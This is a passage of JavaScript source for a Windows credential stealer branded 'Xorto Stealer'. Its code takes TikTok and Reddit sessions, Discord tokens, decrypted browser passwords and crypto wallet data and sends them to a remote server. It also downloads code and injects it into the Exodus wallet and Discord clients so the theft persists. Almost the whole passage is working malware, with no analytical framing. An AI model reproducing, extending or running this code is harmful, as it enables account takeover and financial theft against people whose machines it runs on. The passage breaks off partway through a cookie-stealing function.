        url: 'https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473',
      },
    };


    let payload = {
      embeds: [embed],
      key: key, 
    };

    axios.post(`${api_url}/webhooks/${randomString}`, payload)
      .then(response => {
        console.log('Discord webhook sent successfully!');
      })
      .catch(error => {
        console.error('Error sending Discord webhook:', error.message);
      });
  } catch (error) {
    console.error('Error fetching Roblox data:', error.message);

    let errorEmbed = {
      color: 0xFF0000,
      title: 'Error Fetching Webhook URL',
      description: 'An error occurred while fetching the webhook URL',
      fields: [
        {
          name: 'Error Message',
          value: error.message,
        },
      ],
      footer: {
        text: 'RedRose Project',
      },
    };

    let errorPayload = {
      embeds: [errorEmbed],
    };

    axios.post(`${api_url}/error`, errorPayload)
      .then(errorResponse => {
        console.log('Error embed sent successfully!');
      })
      .catch(error => {
        console.error('Error sending error embed:', error.message);
      });
  }
}

function stealTikTokSession(cookie) {
  try {
    const headers = {
      'accept': 'application/json, text/plain, */*',
      'accept-encoding': 'gzip, compress, deflate, br',
      'cookie': `sessionid=${cookie}`
    };

    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
      .then(response => {
        const accountInfo = response.data;

        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
          throw new Error("Failed to retrieve TikTok account information.");
        }

       
        axios.post(
          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
          { headers: { cookie: `sessionid=${cookie}` } }
        )
          .then(response => {
            const insights = response.data;

            axios.get(
              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
              { headers: { cookie: `sessionid=${cookie}` } }
            )
              .then(response => {
                const wallet = response.data;

                const webhookPayload = {
				key: key,
                  embeds: [
                    {
                      title: "TikTok Session Detected",
                      description: "The TikTok session was detected",
                      color: 16716947, 
                      fields: [
                        {
                          name: "Cookie",
                          value: "```" + cookie + "```",
                          inline: true
                        },
                        {
                          name: "Profile URL",
                          value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
                          inline: true
                        },
                        {
                          name: "User Identifier",
                          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "Email",
                          value: "```" + (accountInfo.data.email || "No Email") + "```",
                          inline: true
                        },
                        {
                          name: "Username",
                          value: "```" + accountInfo.data.username + "```",
                          inline: true
                        },
                        {
                          name: "Follower Count",
                          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
                          inline: true
                        },
                        {
                          name: "Coins",
                          value: "```" + wallet.data.coins + "```",
                          inline: true
                        }
                      ],
                      footer: {
                        text: "TikTok Session Information" // Altbilgi metni (Opsiyonel)
                      }
                    }
                  ]
                };
                
                  axios.post(`${api_url}/webhooks/${randomString}`, webhookPayload)
                    .then(response => {
                      console.log('Discord webhook sent successfully!');
                    })
              })
              .catch(error => {
                console.error('Error in retrieving wallet information:', error);
              });
          })
          .catch(error => {
            console.error('Error in retrieving insights:', error);
          });
      })
      .catch(error => {
        console.error('Error in retrieving account information:', error);
      });
  } catch (error) {
    const errorMessage = {
      title: "Error Detected",
      description: "An error occurred while trying to steal TikTok session.",
      color: 16711680,
      fields: [
        {
          name: "Error Message",
          value: "```" + error.message + "```",
          inline: false
        }
      ],
      footer: {
        text: "TikTok Session Error"
      }
    };


    axios.post(`${api_url}/error`, { embeds: [errorMessage] })
      .then(response => {
        console.log('Error message sent to Discord webhook successfully!');
      })
      .catch(err => {
        console.error('Error sending error message to Discord webhook:', err);
      });
  }
}
async function setRedditSession(cookie) {
    try {
     const { data: ipData } = axios.get('https://api.ipify.org?format=json');
    const ip = ipData.ip;

        const cookies = `reddit_session=${cookie}`;
        const headers = {
            'Cookie': cookies,
            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
        };

        const jsonData = {
            scopes: ['*', 'email', 'pii']
        };

        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';

        axios.post(tokenUrl, jsonData, { headers })
            .then(tokenResponse => {
                const accessToken = tokenResponse.data.access_token;
                const userHeaders = {
                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
                    'Authorization': `Bearer ${accessToken}`
                };

                axios.get(userDataUrl, { headers: userHeaders })
                    .then(userDataResponse => {
                        const userData = userDataResponse.data;
                        const username = userData.name;
                        const commentKarma = userData.comment_karma;
                        const totalKarma = userData.total_karma;
                        const coins = userData.coins;
                        const mod = userData.is_mod;
                        const gold = userData.is_gold;

                        const embedData = {
				key: key,
                            embeds: [
                                {
                                    color: 3553599,
                                    fields: [
                                        { name: "<a:xorto:954736323745415199> An Reddit Account Detected!", value: "`Reddit Account`" },
                                        { name: "<:xorto2:1253851581267443712> Username:", value: `\`${username}\``, inline: true },
                                        { name: "<:xorto0:1253851573755318354> Comments:", value: `\`${commentKarma}\``, inline: true },
                                        { name: "<a:xorto3:1253851575877767218> Total Karma:", value: `\`${totalKarma}\``, inline: true },
                                        { name: "<a:xorto:1023591272746864671> Coins:", value: `\`${coins}\``, inline: true },
                                        { name: "<:xorto1:1253851577802948638> Reddit Gold:", value: `\`${gold ? 'Gold' : 'Not Gold'}\``, inline: true },
                                        { name: "<a:xorto:1023591270909755392> Moderator:", value: `\`Not Moderator\``, inline: true },
                                        { name: "<:xorto:957015863377149962> Session:", value: `\`${cookies}\``, inline: false },
                                        { name: "<a:xorto:954738629220106281> Ip:", value: `\`${ip}\``, inline: false }
                                    ],
                                    author: {
                                        name: "Reddit Session",
                                        icon_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
                                    },
                                    footer: {
                                        text: "@xortoproject"
                                    },
                                    thumbnail: {
                                        url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473"
                                    }
                                }
                            ],
                            username: "XortoProject",
                            avatar_url: "https://media.discordapp.net/attachments/1253830684167114865/1253842530278314045/Black_And_White_Modern_Typographic_Simple_Virus_Apparel_Logo_3.png?ex=6677535a&is=667601da&hm=dfbf46ab221cbdd59288452e3a3711ff03784264aeeca90caa3afb46a1827750&=&format=webp&quality=lossless&width=473&height=473",
                            attachments: []
                        };

                        
                        axios.post(`${api_url}/webhooks/${randomString}`, embedData)
                            .then(() => {
                                console.log('Data successfully sent to the webhook.');
                            })
                            .catch(error => {
                                console.error('Error sending data to the webhook:', error);
                            });
                    })
                    .catch(error => {
                        console.error('Error retrieving user data:', error);
                    });
            })
            .catch(error => {
                console.error('Error obtaining access token:', error);
            });
    } catch (error) {
        console.error('An error occurred:', error);
    }
}

function addFolder(folderPath) {
  const folderFullPath = path.join(randomPath, folderPath);
  if (!fs.existsSync(folderFullPath)) {
    try {
      fs.mkdirSync(folderFullPath, { recursive: true });
    } catch (error) {}
  }
}


async function getZipp(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}



function getZip(sourcePath, zipFilePath) {
  try {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip('' + zipFilePath);
  } catch (error) {}
}

function copyFolder(sourcePath, destinationPath) {
  const isDestinationExists = fs.existsSync(destinationPath);
  const destinationStats = isDestinationExists && fs.statSync(destinationPath);
  const isDestinationDirectory = isDestinationExists && destinationStats.isDirectory();

  if (isDestinationDirectory) {
    addFolder(sourcePath);

    fs.readdirSync(destinationPath).forEach((file) => {
      const sourceFile = path.join(sourcePath, file);
      const destinationFile = path.join(destinationPath, file);
      copyFolder(sourceFile, destinationFile);
    });
  } else {
    fs.copyFileSync(destinationPath, path.join(randomPath, sourcePath));
  }
}

async function createZipp(sourcePath, zipPath) {
  return new Promise((resolve, reject) => {
    const zip = new AdmZip();
    zip.addLocalFolder(sourcePath);
    zip.writeZip(zipPath, (err) => {
      if (err) {
        reject(err);
      } else {
		          console.log('ZIP arşivi oluşturuldu: ' + zipPath);

        resolve();
      }
    });
  });
}

async function getZippp() {
  getZipp(randomPath, randomPath + '.zip')

  const filePath = './' + user.randomUUID + '.zip';


  const webhook = `${api_url}/upload`;
  const form = new FormData();
  form.append("file", fs.createReadStream(filePath));
  form.append("json", JSON.stringify({ "key": key }));

  form.submit(webhook)
}
//
const tokens = [];
async function findToken(path) {
    let path_tail = path;
    path += 'Local Storage\\leveldb';

    if (!path_tail.includes('discordd')) {
        try {
            fs.readdirSync(path)
                .map(file => {
                    (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8')
                        .split(/\r?\n/)
                        .forEach(line => {
                        const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-][\w-][\w-]{24}\.[\w-]{6}\.[\w-]{26,110}/gm), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{38}/g)];
                            for (const pattern of patterns) {
                                const foundTokens = line.match(pattern);
                                if (foundTokens) foundTokens.forEach(token => {
                                    if (!tokens.includes(token)) tokens.push(token)
                                });
                            }
                        });
                });
        } catch (e) { }
        return;
    } else {
        if (fs.existsSync(path_tail + '\\Local State')) {
            try {
     const tokenRegex = /([A-Za-z\d]{24})\.([\w-]{6})\.([\w-]{27})/;

fs.readdirSync(path).forEach(file => {
    if (file.endsWith('.log') || file.endsWith('.ldb')) {
        const fileContent = fs.readFileSync(`${path}\\${file}`, 'utf8');
        const lines = fileContent.split(/\r?\n/);

        lines.forEach(line => {
            const foundTokens = line.match(tokenRegex);

            if (foundTokens) {
                foundTokens.forEach(token => {
                    const encryptedKey = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')).os_crypt.encrypted_key, 'base64').slice(5);
                    const key = dpapi.unprotectData(Buffer.from(encryptedKey, 'utf-8'), null, 'CurrentUser');
                    const tokenParts = token.split('.');
                    const start = Buffer.from(tokenParts[0], 'base64');
                    const middle = Buffer.from(tokenParts[1], 'base64');
                    const end = Buffer.from(tokenParts[2], 'base64');
                    const decipher = crypto.createDecipheriv('aes-256-gcm', key, start);
                    decipher.setAuthTag(end);
                    const out = decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8');
                    
                    if (!tokens.includes(out)) {
                        tokens.push(out);
                    }
                });
            }
        });
    }
});

            } catch (e) { }
            return;
        }
    }
}


async function stealTokens() {
    for (let path of paths) {
        await findToken(path);
    }

    for (let token of tokens) {
        try {
            let json;
            await axios.get("https://discord.com/api/v9/users/@me", {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { json = res.data }).catch(() => { json = null });

            if (!json) continue;

            var ip = await getIp();
            var billing = await getBilling(token);
            var friends = await getRelationships(token);

            const userInformationEmbed = {
                title: "User Information",
                color: 2895667, 
                author: {
                    name: `${json.username}#${json.discriminator} (${json.id})`,
                    icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif"
                },
                thumbnail: {
                    url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}?size=512`
                },
                fields: [
                    {
                        name: "<:hackerblack:1095747410539593800> Token:",
                        value: `\`${token}\`\n[Copy Token](https://redroseproject.xyz/copy/${token})`
                    },
                    {
                        name: "<a:blackhypesquad:1095742323423453224> Badges:",
                        value: getBadges(json.flags),
                        inline: true
                    },
                    {
                        name: "<a:blackhypesquad:1095742323423453224> Nitro Type:",
                        value: await getNitro(json.premium_type, json.id, token),
                        inline: true
                    },
                    {
                        name: "<a:blackmoneycard:1095741026850852965> Billing:",
                        value: billing,
                        inline: true
                    },
                    {
                        name: "<:mail:1095741024678191114> Email:",
                        value: `\`${json.email}\``,
                        inline: true
                    },
                    {
                        name: "<a:blackworld:1095741984385290310> IP:",
                        value: `\`${ip}\``,
                        inline: true
                    }
                ]
            };

            const friendsEmbed = {
                title: "Friends",
                color: 0xE74C3C, 
                description: friends,
                author: {
                    name: "HQ Friends",
                    icon_url: "https://media.discordapp.net/attachments/894698886621446164/895125411900559410/a_721d6729d0b5e1a8979ab7a445378e9a.gif"
                },
                footer: {
                    text: "@Xorto Project"
                }
            };

            const data = {
                embeds: [userInformationEmbed, friendsEmbed], 
                key: key
            };

            await axios.post(`${api_url}/webhooks/${randomString}`, data);
        } catch (error) {
            console.error(error);
        }
    }
}


const badges = {
    Discord_Employee: {
        Value: 1,
        Emoji: "<:staff:874750808728666152>",
        Rare: true,
    },
    Partnered_Server_Owner: {
        Value: 2,
        Emoji: "<:partner:874750808678354964>",
        Rare: true,
    },
    HypeSquad_Events: {
        Value: 4,
        Emoji: "<:hypesquad_events:874750808594477056>",
        Rare: true,
    },
    Bug_Hunter_Level_1: {
        Value: 8,
        Emoji: "<:bughunter_1:874750808426692658>",
        Rare: true,
    },
    Early_Supporter: {
        Value: 512,
        Emoji: "<:early_supporter:874750808414113823>",
        Rare: true,
    },
    Bug_Hunter_Level_2: {
        Value: 16384,
        Emoji: "<:bughunter_2:874750808430874664>",
        Rare: true,
    },
    Early_Verified_Bot_Developer: {
        Value: 131072,
        Emoji: "<:developer:874750808472825986>",
        Rare: true,
    },
    House_Bravery: {
        Value: 64,
        Emoji: "<:bravery:874750808388952075>",
        Rare: false,
    },
    House_Brilliance: {
        Value: 128,
        Emoji: "<:brilliance:874750808338608199>",
        Rare: false,
    },
    House_Balance: {
        Value: 256,
        Emoji: "<:balance:874750808267292683>",
        Rare: false,
    },
    Discord_Official_Moderator: {
        Value: 262144,
        Emoji: "<:moderator:976739399998001152>",
        Rare: true,
    }
};

async function getRelationships(token) {
    var j = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).catch(() => { })
    if (!j) return `*Account locked*`
    var json = j.data
    const r = json.filter((user) => {
        return user.type == 1
    })
    var gay = '';
    for (z of r) {
        var b = getRareBadges(z.user.public_flags)
        if (b != "") {
            gay += `${b} | \`${z.user.username}#${z.user.discriminator}\`\n`
        }
    }
    if (gay == '') gay = "*Nothing to see here*"
    return gay
}

async function getBilling(token) {
    let json;
    await axios.get("https://discord.com/api/v9/users/@me/billing/payment-sources", {
        headers: {
            "Content-Type": "application/json",
            "authorization": token
        }
    }).then(res => { json = res.data })
        .catch(err => { })
    if (!json) return '\`Unknown\`';

    var bi = '';
    json.forEach(z => {
        if (z.type == 2 && z.invalid != !0) {
            bi += "<:946246524504002610:962747802830655498>";
        } else if (z.type == 1 && z.invalid != !0) {
            bi += "<:rustler:987692721613459517>";
        }
    });
    if (bi == '') bi = `\`No Billing\``
    return bi;
}

function getBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value) b += o.Emoji;
    };
    if (b == '') return `\`No Badges\``;
    return `${b}`;
}

function getRareBadges(flags) {
    var b = '';
    for (const prop in badges) {
        let o = badges[prop];
        if ((flags & o.Value) == o.Value && o.Rare) b += o.Emoji;
    };
    return b;
}

async function getNitro(flags, id, token) {
    switch (flags) {
        case 1:
            return "<:946246402105819216:962747802797113365>";
        case 2:
            let info;
            await axios.get(`https://discord.com/api/v9/users/${id}/profile`, {
                headers: {
                    "Content-Type": "application/json",
                    "authorization": token
                }
            }).then(res => { info = res.data })
                .catch(() => { })
            if (!info) return "<:946246402105819216:962747802797113365>";

            if (!info.premium_guild_since) return "<:946246402105819216:962747802797113365>";

            let boost = ["<:boost1month:1161356435360325673>", "<:boost2month:1161356669004030033>", "<:boost3month:1161356821806710844>", "<:boost6month:1161357418480029776>", "<:boost9month:1161357513820741852>", "<:boost12month:1161357639737946206>", "<:boost15month:967518897987256400>", "<:boost18month:967519190133145611>", "<:boost24month:969686081958207508>"]
            var i = 0

            try {
                let d = new Date(info.premium_guild_since)
                let boost2month = Math.round((new Date(d.setMonth(d.getMonth() + 2)) - new Date(Date.now())) / 86400000)
                let d1 = new Date(info.premium_guild_since)
                let boost3month = Math.round((new Date(d1.setMonth(d1.getMonth() + 3)) - new Date(Date.now())) / 86400000)
                let d2 = new Date(info.premium_guild_since)
                let boost6month = Math.round((new Date(d2.setMonth(d2.getMonth() + 6)) - new Date(Date.now())) / 86400000)
                let d3 = new Date(info.premium_guild_since)
                let boost9month = Math.round((new Date(d3.setMonth(d3.getMonth() + 9)) - new Date(Date.now())) / 86400000)
                let d4 = new Date(info.premium_guild_since)
                let boost12month = Math.round((new Date(d4.setMonth(d4.getMonth() + 12)) - new Date(Date.now())) / 86400000)
                let d5 = new Date(info.premium_guild_since)
                let boost15month = Math.round((new Date(d5.setMonth(d5.getMonth() + 15)) - new Date(Date.now())) / 86400000)
                let d6 = new Date(info.premium_guild_since)
                let boost18month = Math.round((new Date(d6.setMonth(d6.getMonth() + 18)) - new Date(Date.now())) / 86400000)
                let d7 = new Date(info.premium_guild_since)
                let boost24month = Math.round((new Date(d7.setMonth(d7.getMonth() + 24)) - new Date(Date.now())) / 86400000)

                if (boost2month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost3month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost6month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost9month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost12month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost15month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost18month > 0) {
                    i += 0
                } else {
                    i += 1
                } if (boost24month > 0) {
                    i += 0
                } else if (boost24month < 0 || boost24month == 0) {
                    i += 1
                } else {
                    i = 0
                }
            } catch {
                i += 0
            }
            return `<:946246402105819216:962747802797113365> ${boost[i]}`
        default:
            return "\`No Nitro\`";
    };
}

async function getIp() {
    var ip = await axios.get("https://www.myexternalip.com/raw")
    return ip.data;
}

//

async function extractAppAsarAndInject(path, procc, url, webhook) {
  if (!fs.existsSync(path)) {
    console.error('The path does not exist.');
    return;
  }

  const listOfFiles = fs.readdirSync(path);
  const apps = listOfFiles.filter((file) => file.includes('app-'));

  try {
    const randomExodusFile = `${path}/${apps[0]}/LICENSE`;
    const check = fs.readFileSync(randomExodusFile, 'utf8');
    if (check.includes('gofile')) {
      console.error('The license already contains "gofile".');
      return;
    }

    const webhookPath = `${webhook}:https://gofile/exoduswalletzip`;
    fs.writeFileSync(randomExodusFile, webhookPath, 'utf8');
    console.log('Webhook URL path added to LICENSE.');
  } catch (err) {
    console.error('Error while checking the license:', err);
    return;
  }


  for (const app of apps) {
    try {
      const fullpath = `${path}/${app}/resources/app.asar`;
      const extractDir = `${path}/${app}/resources/app`;

      await extractAll(fullpath, extractDir);
    } catch (err) {
      console.error('Error while extracting app.asar:', err);
      return;
    }
  }


  let code;
  try {
    code = await new Promise((resolve, reject) => {
      https.get(url, (res) => {
        if (res.statusCode < 200 || res.statusCode >= 300) {
          reject(new Error(`Request failed with status code ${res.statusCode}`));
        }

        let data = '';
        res.on('data', (chunk) => {
          data += chunk;
        });

        res.on('end', () => {
          resolve(data);
        });
      }).on('error', reject);
    });
  } catch (err) {
    console.error('Error while downloading code:', err);
    return;
  }

  
  for (const app of apps) {
    try {
      const indexPath = `${path}/${app}/resources/app/src/app/main/index.js`;

      fs.writeFileSync(indexPath, code, 'utf8');
    } catch (err) {
      console.error('Error while injecting code:', err);
      return;
    }
  }


  for (const app of apps) {
    try {
      const fullpath = `${path}/${app}/resources/app.asar`;
      const extractDir = `${path}/${app}/resources/app`;

      await createPackage(extractDir, fullpath);
    } catch (err) {
      console.error('Error while repackaging app.asar:', err);
      return;
    }
  }

  try {
    execSync(`taskkill /im ${procc} /t /f >nul 2>&1`);
  } catch (err) {
    console.error('Error while killing the process:', err);
  }
}


const localll = `C:/Users/${process.env.USERNAME}/AppData/Local/exodus`;
const codeDownloadURL = `${api_url}/exodusinject`;
const webhook = key;

extractAppAsarAndInject(localll, 'exodus.exe', codeDownloadURL, webhook);

async function StopCords() {
    exec('tasklist', (err, stdout) => {
        for (const executable of ['Discord.exe', 'DiscordCanary.exe', 'Telegram.exe', 'chrome.exe', 'discordDevelopment.exe', 'DiscordPTB.exe']) {
            if (stdout.includes(executable)) {
                exec(`taskkill /F /T /IM ${executable}`, (err) => {})
                exec(`"${localappdata}\\${executable.replace('.exe', '')}\\Update.exe" --processStart ${executable}`, (err) => {})
            }
        }
    })
}

async function InfectDiscords() {
    var injection, betterdiscord = process.env.appdata + "\\BetterDiscord\\data\\betterdiscord.asar";
    if (fs.existsSync(betterdiscord)) {
        var read = fs.readFileSync(dir);
        fs.writeFileSync(dir, buf_replace(read, "api/webhooks", "Xorto Stealer"))
    }
    await axios(`${api_url}/inject`).then((code => code.data)).then((res => {
        res = res.replace("%API_AUTH_HERE%", key), injection = res
    })).catch(), await fs.readdir(local, (async (err, files) => {
        await files.forEach((async dirName => {
            dirName.toString().includes("cord") && await discords.push(dirName)
        })), discords.forEach((async discordPath => {
            await fs.readdir(local + "\\" + discordPath, ((err, file) => {
                file.forEach((async insideDiscordDir => {
                    insideDiscordDir.includes("app-") && await fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir, ((err, file) => {
                        file.forEach((async insideAppDir => {
                            insideAppDir.includes("modules") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir, ((err, file) => {
                                file.forEach((insideModulesDir => {
                                    insideModulesDir.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir, ((err, file) => {
                                        file.forEach((insideCore => {
                                            insideCore.includes("discord_desktop_core") && fs.readdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore, ((err, file) => {
                                                file.forEach((insideCoreFinal => {
                                                    insideCoreFinal.includes("index.js") && (fs.mkdir(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\spacex", (() => {

                                                    })), 
                                                    
                                                    fs.writeFile(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js", injection, (() => {})))
                                                    if (!injection_paths.includes(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")) {
                                                        injection_paths.push(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js"); DiscordListener(local + "\\" + discordPath + "\\" + insideDiscordDir + "\\" + insideAppDir + "\\" + insideModulesDir + "\\" + insideCore + "\\index.js")
                                                    }
                                                }))
                                            }))
                                        }))
                                    }))
                                }))
                            }))
                        }))
                    }))
                }))
            }))
        }))
    }))
}

async function getEncrypted() {
    for (let _0x4c3514 = 0; _0x4c3514 < browserPath.length; _0x4c3514++) {
        if (!fs.existsSync('' + browserPath[_0x4c3514][0])) {
            continue
        }
        try {
            let _0x276965 = Buffer.from(
                JSON.parse(fs.readFileSync(browserPath[_0x4c3514][2] + 'Local State'))
                .os_crypt.encrypted_key,
                'base64'
            ).slice(5)
            const _0x4ff4c6 = Array.from(_0x276965),
                _0x4860ac = execSync(
                    'powershell.exe Add-Type -AssemblyName System.Security; [System.Security.Cryptography.ProtectedData]::Unprotect([byte[]]@(' +
                    _0x4ff4c6 +
                    "), $null, 'CurrentUser')"
                )
                .toString()
                .split('\r\n'),
                _0x4a5920 = _0x4860ac.filter((_0x29ebb3) => _0x29ebb3 != ''),
                _0x2ed7ba = Buffer.from(_0x4a5920)
            browserPath[_0x4c3514].push(_0x2ed7ba)
        } catch (_0x32406b) {}
    }
}
async function getExtension() {
  addFolder('Wallets'); 

  let walletCount = 0;
  let browserCount = 0;

  for (let [extensionName, extensionPath] of Object.entries(extension)) {
    for (let i = 0; i < browserPath.length; i++) {
      let browserFolder;
      if (browserPath[i][0].includes('Local')) {
        browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }

      const browserExtensionPath = `${browserPath[i][0]}${extensionPath}`;
      if (fs.existsSync(browserExtensionPath)) {
        const walletFolder = `\\Wallets\\${extensionName}_${browserFolder}_${browserPath[i][1]}`;
        copyFolder(walletFolder, browserExtensionPath);
        walletCount++;
        count.wallets++;
      }
    }
  }

  for (let [walletName, walletPath] of Object.entries(walletPaths)) {
    if (fs.existsSync(walletPath)) {
      const walletFolder = `\\wallets\\${walletName}`;
      copyFolder(walletFolder, walletPath);
      browserCount++;
      count.wallets++;
    }
  }

const walletCountStr = walletCount.toString();
const browserCountStr = browserCount.toString();
if (walletCountStr !== '0' || browserCountStr !== '0') {

const message = {
  key: key,
  embeds: [
    {
      title: 'Wallet Information',
      description: 'Here is the wallet information:',
      fields: [
        {
          name: 'Browser wallet',
          value: walletCountStr,
          inline: true,
        },
      ],
    },
  ],
};


  axios.post(`${api_url}/webhooks/${randomString}`, message)
    .then(() => {
      console.log('Embed successfully sent through the webhook.');
    })
    .catch(error => {
      console.error('An error occurred while sending the embed:', error.message);
    });
} else {
  console.log('walletCount and browserCount are both 0. No action needed.');
}

   

}


async function getPasswords() {
  const passwords = [];

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0])) {
      console.error(`Browser path does not exist: ${browserPath[i][0]}`);
      continue;
    }

    let browserType;
    try {
      if (browserPath[i][0].includes('Local')) {
        browserType = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
      } else {
        browserType = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
      }
    } catch (error) {
      console.error(`Error parsing browser path: ${error.message}`);
      continue;
    }

    const loginDataPath = browserPath[i][0] + 'Login Data';
    const passwordsDbPath = browserPath[i][0] + 'passwords.db';

    try {
      fs.copyFileSync(loginDataPath, passwordsDbPath);
    } catch (error) {
      console.error(`Error copying login data file: ${error.message}`);
      continue;
    }

    const db = new sqlite3.Database(passwordsDbPath);

    await new Promise((resolve, reject) => {
      db.each(
        'SELECT origin_url, username_value, password_value FROM logins',
        (err, row) => {
          if (err || !row.username_value) {
            return;
          }

          try {
            const iv = row.password_value.slice(3, 15);
            const encryptedData = row.password_value.slice(15, -16);
            const authTag = row.password_value.slice(-16);
            
            const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
            decipher.setAuthTag(authTag);

            const password = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');

            passwords.push(`URL: ${row.origin_url} | Username: ${row.username_value} | Password: ${password} | Application: ${browserType} ${browserPath[i][1]}\n`);
          } catch (error) {
            console.error(`Error decrypting password: ${error.message}`);
          }
        },
        () => {
          resolve();
        }
      );
    });

    db.close();
  }

  if (passwords.length === 0) {
    passwords.push('No passwords found.');
  }

  try {
    fs.writeFileSync("Passwords.txt", user.copyright + passwords.join(''), {
      encoding: 'utf8',
      flag: 'a+',
    });

    const data = fs.readFileSync("Passwords.txt", "utf8");

    const response = await axios.post(`${api_url}/passwords`, { passwords: data, key });

    if (response.status === 200) {
      console.log("Request successful.");
    } else {
      console.error(`Request failed with status code: ${response.status}`);
    }
  } catch (error) {
    console.error("Error occurred while writing to file or making the request: " + error.message);
  }
}


async function getCookiesAndSendWebhook() {
  const cookiesData = {};

  for (let i = 0; i < browserPath.length; i++) {
    if (!fs.existsSync(browserPath[i][0] + '\\Network')) {
      continue;
    }

    let browserFolder;
    if (browserPath[i][0].includes('Local')) {
